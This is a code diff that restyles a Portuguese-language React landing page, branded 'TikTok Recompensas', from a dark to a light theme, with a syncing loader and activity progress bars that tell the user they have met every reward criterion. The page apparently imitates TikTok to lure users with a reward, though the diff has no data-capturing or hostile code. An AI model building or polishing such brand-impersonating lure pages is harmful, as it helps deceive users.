@@ -73,39 +73,39 @@ const ActivityLanding = () => {
 
   if (loading) {
     return (
-      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black">
+      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white">
         <img src={tiktokLogo} alt="TikTok" className="w-16 h-16 mb-4 animate-pulse" />
-        <div className="w-10 h-10 rounded-full border-[3px] border-gray-700 border-t-[#fe2c55] animate-spin mb-4" />
-        <p className="text-sm text-gray-400 font-medium">Sincronizando com a sua conta...</p>
+        <div className="w-10 h-10 rounded-full border-[3px] border-gray-200 border-t-[#fe2c55] animate-spin mb-4" />
+        <p className="text-sm text-gray-500 font-medium">Sincronizando com a sua conta...</p>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-black flex items-center justify-center p-4">
+    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center p-4">
       <div className="w-full max-w-md space-y-4">
         {/* Header with TikTok branding */}
         <div className="flex items-center justify-center gap-2 mb-2">
           <img src={tiktokLogo} alt="TikTok" className="w-8 h-8" />
-          <span className="text-white font-bold text-lg">TikTok Recompensas</span>
+          <span className="text-gray-900 font-bold text-lg">TikTok Recompensas</span>
         </div>
 
         {/* Main card */}
-        <div className="bg-[#1a1a1a] rounded-2xl border border-gray-800 p-6 space-y-5">
+        <div className="bg-white rounded-2xl shadow-lg p-6 space-y-5">
           <div>
-            <h1 className="text-[22px] font-bold text-white leading-tight">
+            <h1 className="text-[22px] font-bold text-gray-900 leading-tight">
               Você atingiu todos os{" "}
               <span className="text-[#fe2c55]">critérios de atividade.</span>
             </h1>
-            <p className="text-sm text-gray-400 mt-2 leading-relaxed">
+            <p className="text-sm text-gray-500 mt-2 leading-relaxed">
               Confirmamos que sua conta cumpriu os requisitos mínimos de uso. Confira o resumo abaixo e toque para liberar o seu progresso.
             </p>
           </div>
 
           {/* Stats box */}
-          <div className="border border-gray-700/50 rounded-xl p-4 space-y-4 bg-black/30">
-            <div className="flex items-center gap-2 text-sm font-medium text-gray-300">
-              <span className="w-2 h-2 rounded-full bg-[#25f4ee] inline-block animate-pulse" />
+          <div className="border border-gray-100 rounded-xl p-4 space-y-4 bg-gray-50/50">
+            <div className="flex items-center gap-2 text-sm font-medium text-gray-600">
+              <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block animate-pulse" />
               Detalhes da sua atividade
             </div>
 
@@ -114,17 +114,17 @@ const ActivityLanding = () => {
               return (
                 <div key={i} className="space-y-1.5">
                   <div className="flex items-center justify-between">
-                    <span className="text-sm text-gray-300 flex items-center gap-1.5">
-                      {isComplete && <span className="text-[#25f4ee] text-xs">✓</span>}
+                    <span className="text-sm text-gray-700 flex items-center gap-1.5">
+                      {isComplete && <span className="text-emerald-500 text-xs">✓</span>}
                       {stat.label}
                     </span>
-                    <span className={`text-sm font-medium tabular-nums ${isComplete ? "text-[#25f4ee]" : "text-gray-500"}`}>
+                    <span className={`text-sm font-medium tabular-nums ${isComplete ? "text-emerald-500" : "text-gray-400"}`}>
                       {stat.current}/{stat.target}
                     </span>
                   </div>
-                  <div className="w-full h-1.5 bg-gray-800 rounded-full overflow-hidden">
+                  <div className="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden">
                     <div
-                      className={`h-full rounded-full transition-all duration-1000 ease-out ${isComplete ? "bg-[#25f4ee]" : "bg-[#fe2c55]"}`}
+                      className={`h-full rounded-full transition-all duration-1000 ease-out ${isComplete ? "bg-emerald-500" : "bg-[#fe2c55]"}`}
                       style={{ width: `${stat.fillPercent}%` }}
                     />
                   </div>
@@ -134,7 +134,7 @@ const ActivityLanding = () => {
           </div>
 
           {/* Status message */}
-          <p className={`text-center text-sm ${statusIdx === 3 ? "text-[#25f4ee] font-medium" : "text-gray-500"}`}>
+          <p className={`text-center text-sm ${statusIdx === 3 ? "text-emerald-500 font-medium" : "text-gray-400"}`}>
             {STATUS_MESSAGES[statusIdx]}
           </p>
 
